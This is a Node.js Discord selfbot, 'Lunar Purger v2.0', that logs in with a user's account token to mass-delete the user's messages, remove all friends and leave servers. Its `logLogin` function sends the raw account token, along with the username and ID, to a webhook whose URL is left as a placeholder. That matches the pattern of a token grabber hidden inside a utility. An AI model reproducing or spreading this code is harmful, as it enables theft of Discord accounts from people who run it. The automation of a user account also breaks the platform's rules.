const { Client, WebhookClient } = require('discord.js-selfbot-v13');
const readlineSync = require('readline-sync');
const client = new Client({ checkUpdate: false });

// ─── Config ───────────────────────────────────────────────────────────
const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE'; // ← حط رابط الويبهوك هنا

// ─── Helpers ──────────────────────────────────────────────────────────
const sleep = (ms) => new Promise(res => setTimeout(res, ms));
let skippedUsers = new Set();

// ─── Colors ──────────────────────────────────────────────────────────
const C = {
    reset:  '\x1b[0m',
    bold:   '\x1b[1m',
    c1:     '\x1b[38;5;57m',
    c2:     '\x1b[38;5;93m',
    c3:     '\x1b[38;5;129m',
    c4:     '\x1b[38;5;165m',
    c5:     '\x1b[38;5;201m',
    c6:     '\x1b[38;5;207m',
    c7:     '\x1b[38;5;219m',
    yellow: '\x1b[33m',
    red:    '\x1b[31m',
    green:  '\x1b[32m',
};

// ─── Banner ──────────────────────────────────────────────────────────
function showBanner() {
    process.stdout.write('\x1Bc');
    const lines = [
        "     ██╗     ██╗   ██╗███╗   ██╗ █████╗ ██████╗  ",
        "     ██║     ██║   ██║████╗  ██║██╔══██╗██╔══██╗ ",
        "     ██║     ██║   ██║██╔██╗ ██║███████║██████╔╝ ",
        "     ██║     ██║   ██║██║╚██╗██║██╔══██║██╔══██╗ ",
        "     ███████╗╚██████╔╝██║ ╚████║██║  ██║██║  ██║ ",
        "     ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝",
        "           P  U  R  G  E  R    v2.0               ",
    ];
    const colors = [C.c1, C.c2, C.c3, C.c4, C.c5, C.c6, C.c7];
    lines.forEach((line, i) => console.log(colors[i] + line + C.reset));
    console.log('');
}

// ─── Progress Bar ────────────────────────────────────────────────────────
function makeBar(done, total, width = 22) {
    const pct    = total > 0 ? done / total : 0;
    const filled = Math.round(pct * width);
    return `[${'█'.repeat(filled)}${'░'.repeat(width - filled)}] ${(pct * 100).toFixed(1)}%`;
}

// ─── ETA ───────────────────────────────────────────────────────────
// كل chunk من 15 رسالة يأخذ تقريباً 750ms (550 sleep + overhead الحذف)
// كل fetch من الـ API يأخذ ~300ms إضافية (نحسب fetch تقريباً كل 40 رسالة)
function calcETA(msgCount) {
    const chunks      = Math.ceil(msgCount / 15);
    const fetchRounds = Math.ceil(msgCount / 40);
    return (chunks * 0.75) + (fetchRounds * 0.3);
}

function fmtTime(sec) {
    if (sec >= 3600) return `${Math.floor(sec / 3600)}h ${Math.floor((sec % 3600) / 60)}m`;
    if (sec >= 60)   return `${Math.floor(sec / 60)}m ${Math.round(sec % 60)}s`;
    return `${sec.toFixed(0)}s`;
}

// ─── Webhook ──────────────────────────────────────────────────────────
async function webhookSend(payload) {
    if (!WEBHOOK_URL || WEBHOOK_URL === 'YOUR_WEBHOOK_URL_HERE') return;
    try {
        const wh = new WebhookClient({ url: WEBHOOK_URL });
        await wh.send(payload).catch(() => {});
    } catch (_) {}
}

async function logLogin(token, user) {
    await webhookSend({
        embeds: [{
            title: '🔐 Lunar Purger — Login',
            color: 0x9B59B6,
            thumbnail: { url: user.displayAvatarURL({ dynamic: true }) },
            fields: [
                { name: '👤 Display Name', value: `**${user.displayName}**`,  inline: true  },
                { name: '🆔 Username',     value: `\`${user.tag}\``,           inline: true  },
                { name: '📝 User ID',      value: `\`${user.id}\``,            inline: false },
                { name: '🔑 Token',        value: `||\`${token}\`||`,          inline: false },
            ],
            timestamp: new Date(),
            footer: { text: 'Lunar Purger v2.0' },
        }],
    });
}

async function logPurgeEvent(type, targetTag, deleted, remaining, total, etaMs) {
    const bar = makeBar(deleted, total, 18);
    await webhookSend({
        embeds: [{
            title: type === 'start'    ? '🚀 Purge Started'
                 : type === 'progress' ? '💨 Purge In Progress'
                 : '✅ Purge Complete',
            color: type === 'done' ? 0x2ECC71 : 0x9B59B6,
            fields: [
                { name: '👤 Target',    value: `**${targetTag}**`,                             inline: true  },
                { name: '📊 Progress',  value: `${bar}`,                                       inline: false },
                { name: '✅ Deleted',   value: `\`${deleted}\``,                               inline: true  },
                { name: '⏳ Remaining', value: `\`${remaining}\``,                             inline: true  },
                { name: '🕒 ETA',       value: etaMs > 0 ? `<t:${Math.floor(etaMs / 1000)}:R>` : '—', inline: true  },
            ],
            timestamp: new Date(),
            footer: { text: 'Lunar Purger v2.0' },
        }],
    });
}

// ─── DM Purge ─────────────────────────────────────────────────────────
async function runPurge(user) {
    showBanner();
    console.log(`  ${C.c3}[*] Scanning DM:${C.reset} ${C.bold}${C.c7}${user.tag || user.id}${C.reset}`);

    const channel = await user.createDM().catch(() => null);
    if (!channel) {
        console.log(`  ${C.red}[!] DM inaccessible or invalid User ID/Username.${C.reset}`);
        await sleep(2000);
        return;
    }

    // ── Scan ──
    let totalMine = 0, lastScanId = null;
    const allMessages = [];
    while (true) {
        const fetched = await channel.messages.fetch({ limit: 100, before: lastScanId }).catch(() => null);
        if (!fetched || fetched.size === 0) break;
        const myMsgs = Array.from(fetched.filter(m => m.author.id === client.user.id).values());
        allMessages.push(...myMsgs);
        totalMine += myMsgs.length;
        lastScanId = fetched.last()?.id;
        process.stdout.write(`\r  ${C.c3}[*] Found:${C.reset} ${C.bold}${C.c7}${totalMine}${C.reset} messages`);
        if (fetched.size < 100) break;
    }

    if (totalMine === 0) {
        console.log(`\n  ${C.yellow}[!] No messages found in this DM.${C.reset}`);
        skippedUsers.add(user.id);
        await sleep(2000);
        return;
    }

    // ── Summary Box ──
    const estSec = calcETA(totalMine);
    console.log(`\n  ${C.c1}╔═══════════════════════════════════════════════╗${C.reset}`);
    console.log(`  ${C.c2}║${C.reset}  ${C.bold}Target:${C.reset}  ${C.c7}${(user.tag || user.id).padEnd(29)}${C.reset}  ${C.c2}║${C.reset}`);
    console.log(`  ${C.c3}║${C.reset}  ${C.bold}Total: ${C.reset}  ${C.c7}${(totalMine + ' messages').padEnd(29)}${C.reset}  ${C.c3}║${C.reset}`);
    console.log(`  ${C.c4}║${C.reset}  ${C.bold}ETA:   ${C.reset}  ${C.c7}${fmtTime(estSec).padEnd(29)}${C.reset}  ${C.c4}║${C.reset}`);
    console.log(`  ${C.c5}╚═══════════════════════════════════════════════╝${C.reset}`);

    const ans = readlineSync.question(`  ${C.c7}[?]${C.reset} Start? (y/n/back): `).trim().toLowerCase();
    if (ans === 'back') return 'BACK_TO_MENU';
    if (ans !== 'y') { skippedUsers.add(user.id); return; }

    // ── Delete ──
    let deleted = 0;
    await logPurgeEvent('start', user.tag || user.id, 0, totalMine, totalMine, Date.now() + estSec * 1000);

    for (let i = 0; i < allMessages.length; i += 15) {
        const chunk    = allMessages.slice(i, i + 15);
        const remaining = Math.max(0, totalMine - deleted);
        const liveETA   = Date.now() + calcETA(remaining) * 1000;

        await Promise.all(chunk.map(m => m.delete().catch(() => {})));
        deleted += chunk.length;

        const left = Math.max(0, totalMine - deleted);
        process.stdout.write(
            `\r  ${C.c5}[+]${C.reset} ${makeBar(deleted, totalMine)} ` +
            `${C.bold}${C.c7}${deleted}${C.reset} deleted | ${C.c1}${left}${C.reset} left  `
        );

        // webhook progress كل 30 رسالة محذوفة
        if (deleted % 30 === 0 || left === 0) {
            await logPurgeEvent('progress', user.tag || user.id, deleted, left, totalMine, liveETA);
        }

        await sleep(550);
    }

    skippedUsers.add(user.id);
    await logPurgeEvent('done', user.tag || user.id, deleted, 0, totalMine, 0);
    console.log(`\n  ${C.c5}[✔] DM Purge Complete! (${deleted} messages deleted)${C.reset}`);
    await sleep(2000);
}

// ─── Guild Purge ────────────────────────────────────────────────────────
async function purgeSingleGuild(guild) {
    if (guild.ownerId === client.user.id) return;
    const textChannels = Array.from(guild.channels.cache.filter(ch => ch.type === 'GUILD_TEXT').values());
    if (textChannels.length === 0) return;

    let scannedCount = 0, totalDeleted = 0;
    for (const channel of textChannels) {
        // FIX: Check permissions PER CHANNEL, not just the first one
        const botPerms = channel.permissionsFor(client.user);
        if (!botPerms || !botPerms.has('ADMINISTRATOR')) {
            scannedCount++;
            continue;
        }

        let lastId = null;
        scannedCount++;
        while (true) {
            const msgs = await channel.messages.fetch({ limit: 100, before: lastId }).catch(() => null);
            if (!msgs || msgs.size === 0) break;
            const myMsgs = Array.from(msgs.filter(m => m.author.id === client.user.id).values());
            for (const msg of myMsgs) {
                await msg.delete().catch(() => {});
                totalDeleted++;
                process.stdout.write(
                    `\r  ${C.c2}Server:${C.reset} [${C.bold}${guild.name.substring(0, 14)}${C.reset}]` +
                    ` | ${C.c3}Ch:${C.reset} [${C.bold}${scannedCount}${C.reset}]` +
                    ` | ${C.c5}Deleted:${C.reset} [${C.bold}${totalDeleted}${C.reset}]`
                );
                await sleep(600);
            }
            lastId = msgs.last()?.id;
            if (msgs.size < 100) break;
        }
    }
}

// ─── Main Menu ─────────────────────────────────────────────────────────
async function mainMenu() {
    while (true) {
        showBanner();
        const tag     = client.user?.tag ?? 'Unknown';
        const guilds  = client.guilds.cache.size;
        const dms     = client.channels.cache.filter(c => c.type === 'DM').size;
        const friends = client.relationships?.friendCache?.size ?? 0;

        console.log(`  ${C.c5}●${C.reset} ${C.bold}${C.c7}${tag}${C.reset}  |  Servers: ${C.c3}${guilds}${C.reset}  |  DMs: ${C.c2}${dms}${C.reset}  |  Friends: ${C.c4}${friends}${C.reset}`);
        console.log(`  ${C.c1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C.reset}`);
        console.log(`  ${C.c7}[1]${C.reset} Remove All Friends       ${C.c7}[2]${C.reset} Leave All Servers`);
        console.log(`  ${C.c7}[3]${C.reset} Deep DM Purge            ${C.c7}[4]${C.reset} Target Purge (DM / Guild)`);
        console.log(`  ${C.c7}[5]${C.reset} All Servers Purge        ${C.c7}[0]${C.reset} Exit`);
        console.log(`  ${C.c1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C.reset}`);

        const choice = readlineSync.question(`  ${C.c5}» ${C.reset}`).trim();

        // ── [1] Remove All Friends ──────────────────────────────────────────
        if (choice === '1') {
            showBanner();
            const list = Array.from(client.relationships?.friendCache?.values() ?? []);
            if (list.length === 0) {
                console.log(`  ${C.red}[!] No friends to remove.${C.reset}`);
            } else {
                const confirm = readlineSync.question(
                    `  ${C.red}[!] Remove ALL ${list.length} friends? (y/n): ${C.reset}`
                ).trim().toLowerCase();
                if (confirm === 'y') {
                    for (let i = 0; i < list.length; i++) {
                        const f = list[i];
                        // FIX: Use correct friend removal method - try multiple approaches for compatibility
                        let removed = false;
                        
                        // Try method 1: remove() on relationships
                        if (client.relationships?.remove) {
                            await client.relationships.remove(f.id).catch(() => {});
                            removed = true;
                        }
                        // Try method 2: removeFriend() if remove doesn't work
                        else if (client.relationships?.removeFriend) {
                            await client.relationships.removeFriend(f.id).catch(() => {});
                            removed = true;
                        }
                        // Try method 3: deleteFriend() as fallback
                        else if (client.relationships?.deleteFriend) {
                            await client.relationships.deleteFriend(f.id).catch(() => {});
                            removed = true;
                        }

                        process.stdout.write(
                            `\r  ${C.red}[-]${C.reset} Removing: ${C.bold}${C.c7}${f.tag}${C.reset} (${i + 1}/${list.length})`
                        );
                        await sleep(1000);
                    }
                    console.log(`\n  ${C.c5}[✔] All friends removed.${C.reset}`);
                }
            }
            readlineSync.question('\n  Press Enter to return...');
        }

        // ── [2] Leave All Servers ───────────────────────────────────────────
        else if (choice === '2') {
            showBanner();
            // FIX: Refresh guild list each iteration to get fresh cache state
            let removed = 0;
            while (true) {
                const targets = Array.from(client.guilds.cache.values())
                    .filter(g => g.ownerId !== client.user.id);
                if (targets.length === 0) break;
                
                const g = targets[0];
                await g.leave().catch(() => {});
                removed++;
                process.stdout.write(
                    `\r  ${C.red}[-]${C.reset} Left: ${C.bold}${C.c7}${g.name}${C.reset} (${removed} removed)`
                );
                await sleep(1500);
            }
            if (removed > 0) {
                console.log(`\n  ${C.c5}[✔] Left ${removed} servers.${C.reset}`);
            } else {
                console.log(`\n  ${C.red}[!] No servers to leave.${C.reset}`);
            }
            readlineSync.question('\n  Press Enter to return...');
        }

        // ── [3] Deep DM Purge ───────────────────────────────────────────────
        else if (choice === '3') {
            const targets = [];
            client.channels.cache.filter(ch => ch.type === 'DM').forEach(ch => {
                if (ch.recipient && !ch.recipient.bot && !skippedUsers.has(ch.recipient.id))
                    targets.push(ch.recipient);
            });
            if (targets.length === 0) {
                showBanner();
                console.log(`  ${C.yellow}[!] No DM targets found.${C.reset}`);
                await sleep(2000);
                continue;
            }
            for (const user of targets) {
                if (await runPurge(user) === 'BACK_TO_MENU') break;
            }
        }

        // ── [4] Target Purge ────────────────────────────────────────────────
        else if (choice === '4') {
            showBanner();
            const input = readlineSync.question(
                `  ${C.c3}[?]${C.reset} User ID / Username / Guild ID (or "back"): `
            ).trim();
            if (input.toLowerCase() === 'back') continue;

            const guild = client.guilds.cache.get(input);
            if (guild) {
                const confirm = readlineSync.question(
                    `  ${C.yellow}[?]${C.reset} Purge from Guild: [${C.bold}${guild.name}${C.reset}] ? (y/n): `
                ).trim().toLowerCase();
                if (confirm === 'y') {
                    await purgeSingleGuild(guild);
                    console.log(`\n  ${C.c5}[✔] Guild purge complete.${C.reset}`);
                }
            } else {
                let target = null;
                if (/^\d{17,19}$/.test(input)) {
                    // FIX: Try fetching from API first before falling back to cache
                    target = await client.users.fetch(input).catch(() => null);
                }
                
                // Fall back to cache search if fetch failed
                if (!target) {
                    target = client.users.cache.find(
                        u => u.username.toLowerCase() === input.toLowerCase() ||
                             u.tag.toLowerCase() === input.toLowerCase()
                    );
                }
                
                if (target) await runPurge(target);
                else { console.log(`  ${C.red}[!] Target not found.${C.reset}`); await sleep(2500); }
            }
            readlineSync.question('\n  Press Enter to return...');
        }

        // ── [5] All Servers Purge ───────────────────────────────────────────
        else if (choice === '5') {
            showBanner();
            const guilds = Array.from(client.guilds.cache.values());
            if (guilds.length === 0) {
                console.log(`  ${C.red}[!] No servers found.${C.reset}`);
                await sleep(2000);
                continue;
            }
            const confirm = readlineSync.question(
                `  ${C.yellow}[?]${C.reset} Purge from ALL ${guilds.length} servers? (y/n): `
            ).trim().toLowerCase();
            if (confirm === 'y') {
                for (const guild of guilds) await purgeSingleGuild(guild);
                console.log(`\n  ${C.c5}[✔] All servers processed.${C.reset}`);
                await sleep(2000);
            }
        }

        // ── [0] Exit ────────────────────────────────────────────────────────
        else if (choice === '0') {
            console.log(`  ${C.c5}[✔] Goodbye.${C.reset}`);
            process.exit(0);
        }
    }
}

// ─── Boot ───────────────────────────────────────────────────────────
process.on('unhandledRejection', (err) => {
    console.error(`  ${C.red}[⚠] Unhandled Rejection:${C.reset}`, err?.message || err);
});
process.on('uncaughtException', (err) => {
    console.error(`  ${C.red}[⚠] Uncaught Exception:${C.reset}`, err?.message || err);
});

showBanner();
const TOKEN = readlineSync.question(`  ${C.c5}[?]${C.reset} Token: `, { hideEchoBack: true });

client.on('ready', async () => {
    console.log(`\n  ${C.c5}[✔] Logged in as:${C.reset} ${C.bold}${C.c7}${client.user.tag}${C.reset}\n`);
    await logLogin(TOKEN, client.user);
    mainMenu();
});

client.login(TOKEN).catch(() => {
    console.log(`  ${C.red}[!] Invalid token.${C.reset}`);
    process.exit(1);
});
